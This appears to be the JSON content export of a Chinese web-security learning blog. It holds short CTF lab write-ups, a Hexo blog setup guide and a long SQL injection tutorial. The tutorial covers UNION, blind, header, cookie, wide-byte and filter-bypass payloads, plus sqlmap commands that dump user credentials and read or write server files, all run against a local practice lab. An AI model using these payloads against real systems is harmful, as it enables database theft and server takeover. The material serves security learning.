{"meta":{"title":"bansxf's blog","subtitle":"Welcome to my blog","description":"Web Security","author":"bansxf","url":"https://lacc233.github.io","root":"/"},"pages":[{"title":"404 Not Found","date":"2020-05-09T12:01:13.593Z","updated":"2020-05-09T12:01:13.593Z","comments":true,"path":"404/index.html","permalink":"https://lacc233.github.io/404/","excerpt":"","text":"404 很抱歉，您访问的页面不存在 可能是输入地址有误或该地址已被删除"},{"title":"关于","date":"2020-05-09T11:59:05.829Z","updated":"2020-05-09T11:59:05.829Z","comments":true,"path":"about/index.html","permalink":"https://lacc233.github.io/about/","excerpt":"","text":"下面写关于自己的内容"},{"title":"archives","date":"2020-05-09T07:08:17.000Z","updated":"2020-05-09T13:39:12.954Z","comments":true,"path":"archives/index.html","permalink":"https://lacc233.github.io/archives/","excerpt":"","text":""},{"title":"所有分类","date":"2020-05-09T11:59:46.523Z","updated":"2020-05-09T11:59:46.523Z","comments":true,"path":"categories/index.html","permalink":"https://lacc233.github.io/categories/","excerpt":"","text":""},{"title":"我的朋友们","date":"2020-05-09T12:03:21.470Z","updated":"2020-05-09T12:03:21.470Z","comments":true,"path":"friends/index.html","permalink":"https://lacc233.github.io/friends/","excerpt":"这里写友链上方的内容。","text":"这里写友链上方的内容。 这里可以写友链页面下方的文字备注，例如自己的友链规范、示例等。"},{"title":"所有标签","date":"2020-05-09T12:00:03.283Z","updated":"2020-05-09T12:00:03.283Z","comments":true,"path":"tags/index.html","permalink":"https://lacc233.github.io/tags/","excerpt":"","text":""}],"posts":[{"title":"就差一把钥匙","slug":"就差一把钥匙","date":"2020-05-09T15:49:10.000Z","updated":"2020-05-09T23:33:31.845Z","comments":true,"path":"categories/WriteUp/就差一把钥匙/","link":"","permalink":"https://lacc233.github.io/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/","excerpt":"合天网安实验室靶场：就差一把钥匙 难度：初级","text":"合天网安实验室靶场：就差一把钥匙 难度：初级 nmap嗅探，得到robots.txt,访问之 再访问console/ 添加x-forwarded-for: 127.0.0.1,篡改数据后send get flag!","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"}],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"},{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"}]},{"title":"神奇的磁带","slug":"神奇的磁带","date":"2020-05-09T10:55:07.000Z","updated":"2020-05-09T14:44:31.658Z","comments":true,"path":"categories/WriteUp/神奇的磁带/","link":"","permalink":"https://lacc233.github.io/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/","excerpt":"合天网安实验室靶场：神奇的磁带 难度：初级","text":"合天网安实验室靶场：神奇的磁带 难度：初级 这是一个套娃,下面开始蛇皮~ 浏览器访问 burp抓包，cookie值base64解密 1234#解密echo cTEyMzQ1Njc4OTBwLi4= | base64 -d#加密echo q1234567890p.. | base64 提交解密后的值 告诉我们要提交磁带的英文tape 给了个txt文件地址，访问之 提交btzhy 给了个php页面，访问之 看源码，提示密码两位，生成字典，burp爆破模块，爆破之 1crunch 2 2 \"0123456789\" &gt; pwd.txt 比较响应长度，确认为66 提交，get flag!","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"}],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"},{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-06-02T14:50:18.000Z","updated":"2020-05-09T23:57:21.589Z","comments":true,"path":"categories/web安全/sql注入/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/","excerpt":"","text":"介绍定义： 服务端的sql语句被恶意修改并成功执行的行为。 原理： 客户端向服务端发送数据，服务端未严格校验客户端发送数据（sql语言是解释型语言） 产生具体原因： 代码对sql语句的参数过滤不严格 未启用框架的安全配置，如php的gpc 未使用安全框架的查询方法，如对应开发语言的安全框架的查询接口 测试接口未删除 未启用防火墙 未启用其他安全防护设备 业务场景： 所有与数据库产生交互的地方都有可能 登录功能 搜索功能 详情页 商品购买 … 漏洞危害： 数据库信息泄露 网页篡改 网站被挂马，传播恶意软件 数据库被恶意操作 服务器被远程控制，被安装后门 不同人的看法： 研发人员：这不是bug,不要耽误我的开发进度 运维人员：研发怎么回事？ 产品经理：研发怎么回事？ 安全人员：这研发一点安全意识都没有 吃瓜群众：真香（看热闹），？？？说的啥 步骤： 判断是否有注入（是否严格校验）(1).可控参数改变能否影响页面显示(2).输入了sql语句是否能报错（报错可看到数据库的一些语句痕迹，不报错可判断我们的语句是否成功闭合） 什么类型的注入 语句能否被恶意篡改 是否能成功执行 获取数据 mysql数据库库结构：默认mysql和infomation_schema数据库infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。数据库-&gt;表-&gt;字段-&gt;值 分类返回类型：get和post 数据类型：整型，字符型 其他类型：… 报错注入联合注入盲注布尔，时间（sleep,benchmark） burpsuite工具链接：https://pan.baidu.com/s/1pCEyXH5mkD2RojXk7DvXdA提取码：1mbb复制这段内容后打开百度网盘手机App，操作更方便哦 破解参考博客 burpsuite使用参考博客 get基于报错的注入Less-1:‘’1’’ LIMIT 0,1’‘1’’ LIMIT 0,1sql: select password,a from admain where id=’’ LIMIT 0,1 手工注入： 123456789127.0.0.1/sqli/Less-1/?id=1' order by 3 --+ ✔判断字段数联合查询：127.0.0.1/sqli/Less-1/?id=0' UNION SELECT 1,user(),database() --+✔123占位127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ #✔获取表名127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+ #✔获取字段名127.0.0.1/sqli/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users--+ #✔获取字段值 解读： 0x3a为 ”:“ sqlmap: 123456sqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" --dbs --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security --tables --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users --columns --batch#下面(''是错的，要用\"\"或无引号，如下)sqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users -C \"password,username\" --dump --batchsqlmap.py -u \"http://127.0.0.1/sqli/Less-1/?id=1\" -D security -T users -C password,username --dump --batch Less-2:‘’ LIMIT 0,1’‘ LIMIT 0,1sql: select * from admain where id=1 limit 0,1 Less-3：‘’1&#39;) LIMIT 0,1’‘1&#39;) LIMIT 0,1sql: select * from admain where id = (‘1’) limit 0,1 Less-4:‘“1&quot;) LIMIT 0,1’“1&quot;) LIMIT 0,1sql: select * from admain where id=(“1”) limit 0,1 get盲注：基于时间的盲注：Less-9: 127.0.0.1/sqli/Less-9/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+ Less-10: 127.0.0.1/sqli/Less-10/?id=1” and if(ascii(stustr(database(),1,1))=115,1,sleep(3)) –+ 基于boolean的盲注：less-8: 1234127.0.0.1/sqli/Less-8/?id=1' and length(database())=8 --+#可接在 and 后stustr(database(),1,1)asciii(stustr(database(),1,1))=N sqlmap: 1sqlmap -u \"注入点\" --technique T --dbs 注解： T 基于时间 （sqlmap -h/hh 查询详细） Techniques: These options can be used to tweak testing of specific SQL injection techniques 1--technique=TECH SQL injection techniques to use (default \"BEUSTQ\") B: Boolean-based blind SQL injection（布尔型注入）E: Error-based SQL injection（报错型注入）U: UNION query SQL injection（可联合查询注入）S: Stacked queries SQL injection（可多语句查询注入）T: Time-based blind SQL injection（基于时间延迟注入） 默认情况下会测试所有的方式，可选择 mysql读写文件：读： 前提：show global variables like “secure_file_priv”; 修改my.ini 重启phpstudy. select load_file(“f:\\1.txt”)； 1union select 1,load_file(f:www\\\\Less-7\\\\flag.txt),3 --+ 写： 前提：show variables like ‘%general%’; 查看其general_log 是否为 OFF。 若是，则修改为 on 。 1set global general_log &#x3D; on; 123union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &quot;f:www\\\\Less-7\\\\1.php&quot; --+127.0.0.1\\Less-7\\1.php #查看是否写入成功 sqlmap: 1234sqlmap -hhsqlmap -u \"注入点\" --file-read \"文件路经\"4444 --file-write4444 --file-dest post 基于报错 get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。 burpsuite burpsuite 抓取http数据包保存在文件中 sqlmap 1sqlmap -r 文件路径 -p 指定探测参数 get报错注入(未完善)1select count(*) floor(rand(0)*2) 注解： 011011 sql注入绕过大小写，编码，关键字屏蔽，内联注释 post 基于时间和布尔值的盲注burpsuite抓取http报文 时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ 布尔：… and (lenght (database() )&gt;5) –+ sqlmap 12时间 ： sqlmap -r \"文件路径\" -p 参数 --technique T 布尔： sqlmap -r \"文件路径\" -p 参数 --technique B http头中的注入在user-agent 和 referer 未被屏蔽时，可以进行注入 burpsuite user-agent: 1' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1 referer: 1' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1 post_update语句的注入1updatexml(1,concat(0x7e,version(),0x7e),1) 注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。 updatexml和extractvalue函数 cookie注入例：less-20 burpsuite 抓取，用” \\ “判断闭合符号，之后 and 1=1,或 and \\ or 加sql语句 sqlmap 12345sqlmap.py -r \"target.txt\" --level 3 --batch sqlmap.py -r \"target.txt\" --level 3 --batch --dbssqlmap.py -r \"target.txt\" --level 3 --batch -D security --tablessqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users --columns sqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users -C password,username --dump base64注入burpsuite 首先截取，decoder 进行加密，例如：admin\\ base64加密后为：YWRtaW5c 进行报错。 sqlmap 1sqlmap.py -r \"target.txt\" --level 3 --batch --tamper base64encode.py 绕过去除注释的sql注入注释符： –+ –空格 # /* 多行注释 */ preg_replace()函数来替换字符串或字符数组的莫些字符 例：less-23: 1?id=-1' union select 1,database(),'3 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-23/?id=1\" --batch --dbs … 绕过去除and or 的sql注入preg_replace()函数来替换字符串或字符数组的莫些字符 双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||) 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-25/?id=1\" --batch --dbs 绕过去除空格的sql注入%09 :Tab %0a ：换行 %20 ：空格 1http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-27/?id=1\" --batch --dbs 宽字节的注入原理： GBK ：宽字节字符集的一种，Mysql默认字符集, GBK占二字节，ASCII占一字节 php中编码为GBK，函数执行添加的是ASCII编码 %DF (常用)：会被php 中的addslashes 函数转义为” %DF\\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。 1http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-33/?id=1%df%27\" --search --level 3 --risk 1 --thread 10 其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可； GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。 1http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-32/?id=1\" --tamper=unmagicquotes.py Access偏移注入公式： 工具：owasp-zap access:小型数据库，只存在一个库，库内多个表。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"博客搭建","slug":"博客搭建","date":"2018-12-08T04:11:03.000Z","updated":"2020-05-09T23:36:22.913Z","comments":true,"path":"categories/菜鸟互助/博客搭建/","link":"","permalink":"https://lacc233.github.io/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","excerpt":"Hexo + Github 搭建 Blog 和 每次博客的部署","text":"Hexo + Github 搭建 Blog 和 每次博客的部署 准备工作1.安装git git下载地址：链接安装后验证 1$ git --version 出现类似下面的版本号，皆为成功git version 2.19.2.windows.1 2.安装node（其附带npm） node.js下载地址：链接安装后验证 1$ node -v 出现类似下面的版本号(安装最新版本)：v10.14.1 3.安装Hexo命令行输入： 1$ npm install -g hexo-cli 4.创建本地运行库 创建本地仓库文件夹：例F:\\github右键点击该文件夹，Git Bash Here，命令行输入 1$ hexo init myblog 初始化完成！ 本地试运行1.进入博客根目录（myblog） 1cd myblog 2.安装 1npm install 3.运行本地运行(如果4000端口被占用，使用 hexo service -p 5000 修改端口) 1$ hexo server 此时在浏览器输入 http://localhost:4000/ ,访问到博客界面 部署在远程库这里将其部署在github上 1.创建Github账户 略，随便百度一下 2.创建github项目 创建一个名为yourname.github.io的项目（yourname为你github名） 3.生成密钥，用于ssh连接 在本地，右键网站根目录，点击Git Bash 输入下列命令yourname 即为github注册时的用户名youremail 为注册时的邮箱账号第三条命令生成密钥： 123$ git config --global user.name \"yourname\"$ git config --global user.email \"yourEmail\"$ ssh-keygen -t rsa -C \"yourEmail\" 此时在C:\\Users下你的当前账户文件夹下会有一个 .ssh 文件，找到id_rsa.pub文件，复制里面的内容，粘贴至GitHub中（点击右上角用户头像下的Settings，之后点击左侧的SSH and GPG keys，找到New SSH key点击，输入title，并将之前复制的内容粘贴到下面的key中），最后点击Add SSH key，完成。 4.修改配置文件 去博客根目录下的_config.yml文件中，添加如下（yourname就是GitHub的用户名）： 1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master 5.将本地仓库同步到github 在第一次生成以及部署之前，需要安装一个扩展： 1$ npm install hexo-deployer-git --save 清除生成的静态网页缓存数据 1$ hexo clean 生成文章对应的静态页面 1$ hexo g 部署本地站点到github命令 1$ hexo deploy","categories":[{"name":"菜鸟互助","slug":"菜鸟互助","permalink":"https://lacc233.github.io/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/"}],"tags":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://lacc233.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}],"categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"},{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"},{"name":"菜鸟互助","slug":"菜鸟互助","permalink":"https://lacc233.github.io/categories/%E8%8F%9C%E9%B8%9F%E4%BA%92%E5%8A%A9/"}],"tags":[{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"},{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"博客搭建","slug":"博客搭建","permalink":"https://lacc233.github.io/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"}]}